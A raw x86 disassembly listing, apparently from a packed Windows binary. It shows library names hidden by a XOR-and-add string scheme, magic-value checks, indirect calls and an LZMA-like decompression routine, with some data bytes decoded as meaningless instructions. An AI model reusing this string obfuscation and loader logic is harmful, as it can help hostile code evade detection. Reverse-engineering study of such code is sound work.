  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	mov    al,ds:0x3a4461a2
  424069:	inc    esi
  42406a:	int3   
  42406b:	dec    esp
  42406c:	xchg   ebp,eax
  42406d:	dec    eax
  42406e:	push   ebx
  42406f:	xchg   DWORD PTR gs:[edx],eax
  424072:	inc    esp
  424073:	cmp    eax,0x1
  424078:	inc    ebx
  424079:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
